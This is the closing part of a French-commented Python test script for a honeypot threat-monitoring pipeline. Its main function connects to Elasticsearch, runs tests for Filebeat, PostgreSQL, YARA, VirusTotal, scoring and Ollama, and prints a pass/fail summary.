    print(f"  Index : {INDEX_TEST}")
    print(f"  IPs privées  : {IP_PRIVE_COWRIE}, {IP_PRIVE_DIONAEA}, {IP_PRIVE_GALAH}")
    print(f"  IPs publiques: {IP_PUBLIC_TOR}, {IP_PUBLIC_CHINA}, {IP_PUBLIC_GALAH}")

    # Initialiser Elasticsearch
    try:
        from elasticsearch import Elasticsearch
        es = Elasticsearch(
            [{"host": config.ES_HOST, "port": config.ES_PORT, "scheme": "http"}],
            request_timeout=10
        )
    except Exception as e:
        print(f"{ROUGE}Impossible de se connecter à Elasticsearch : {e}{RESET}")
        sys.exit(1)

    # ── Exécution de tous les tests ────────────────────────────────────────────
    debut_total = time.time()

    nettoyer_donnees_test(es)
    injecter_evenements(es)
    tester_elasticsearch(es)
    tester_filebeat()
    tester_postgresql()
    tester_enrichissement()
    tester_yara()
    tester_virustotal()
    tester_scoring()
    tester_ollama()
    tester_pipeline_complet(es)

    duree_totale = time.time() - debut_total

    # ── Résumé final ───────────────────────────────────────────────────────────
    section("RÉSUMÉ FINAL")
    total   = len(resultats)
    reussis = sum(1 for _, ok in resultats if ok)
    echoues = total - reussis
    pct     = int(reussis / total * 100) if total else 0

    print(f"\n  Total   : {total}")
    print(f"  {VERT}Réussis : {reussis}{RESET}")
    if echoues:
        print(f"  {ROUGE}Échoués : {echoues}{RESET}")
    print(f"  Durée   : {duree_totale:.0f}s")
    print()

    if echoues:
        print(f"{ROUGE}Tests échoués :{RESET}")
        for nom, ok in resultats:
            if not ok:
                print(f"  {FAIL} {nom}")

    couleur = VERT if echoues == 0 else (JAUNE if pct >= 80 else ROUGE)
    symbole = "✓ TOUS LES TESTS PASSENT" if echoues == 0 else f"✗ {echoues} ÉCHEC(S)"
    print(f"\n  Score : {pct}%  {couleur}{symbole}{RESET}\n")


if __name__ == "__main__":
    main()
